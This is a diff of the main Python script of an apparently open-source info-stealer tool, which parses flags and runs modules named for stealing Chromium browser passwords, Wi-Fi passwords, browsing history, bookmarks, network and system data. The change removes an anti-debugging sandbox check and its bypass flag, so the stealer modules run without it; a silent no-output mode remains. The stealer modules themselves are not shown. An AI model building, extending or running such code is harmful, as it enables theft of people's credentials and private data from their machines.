@@ -4,7 +4,6 @@ import argparse
 from config import Constant
 from config import Colors
 
-from modules import Antidebug # anti debug
 from modules import ChromiumStealer, WebHistoryStealer, WebBookmarksStealer # browser
 from modules import NetworkInfoStealer, WifiPasswordStealer # network
 from modules import SystemInfoStealer # system
@@ -15,8 +14,6 @@ def parser():
     parser.add_argument("--silent", "-s" , action="store_true", help="Silent Mode - No Console Output", default=False)
     parser.add_argument("--verbose", "-v" , action="store_true", help="Verbose - Display everything that happens", default=True)
     parser.add_argument("--log", "-l" , action="store_true", help="Log to file", default=True)
-    
-    parser.add_argument("--force", "-f" , action="store_true", help="Bypass Sandbox Check", default=True)
     
     parser.add_argument("--all", "-a" , action="store_true", help="Get All Information", default=True)
     
@@ -36,8 +33,6 @@ def parser():
     Constant.Args.silent = args.silent
     Constant.Args.verbose = args.verbose
     Constant.Args.log = args.log
-    
-    Constant.Args.bypassDebugModeCheck = args.force
     
     Constant.Args.all = args.all 
     Constant.Args.browser_all = args.browser_all 
@@ -111,33 +106,25 @@ def main():
     """
     parser()
     
-    if not Constant.Args.bypassDebugModeCheck:
-        notSafe = False
-    else: 
-        notSafe = Antidebug().isDebugMode()
-        
-    if notSafe:
-        cexit()
-    else:
-        if Constant.Args.browser_passwords:
-            ChromiumStealer().run()
-        
-        if Constant.Args.browser_history:
-            WebHistoryStealer().run()
-        
-        if Constant.Args.browser_bookmakrs:
-            WebBookmarksStealer().run()
-        
-        if Constant.Args.network_wifi:
-            WifiPasswordStealer().run()
-        
-        if Constant.Args.network_info:
-            NetworkInfoStealer().run()
-        
-        if Constant.Args.system_all:
-            SystemInfoStealer().run()
-        
-        cexit()
+    if Constant.Args.browser_passwords:
+        ChromiumStealer().run()
+    
+    if Constant.Args.browser_history:
+        WebHistoryStealer().run()
+    
+    if Constant.Args.browser_bookmakrs:
+        WebBookmarksStealer().run()
+    
+    if Constant.Args.network_wifi:
+        WifiPasswordStealer().run()
+    
+    if Constant.Args.network_info:
+        NetworkInfoStealer().run()
+    
+    if Constant.Args.system_all:
+        SystemInfoStealer().run()
+    
+    cexit()
 
 if __name__ == "__main__":
     main()
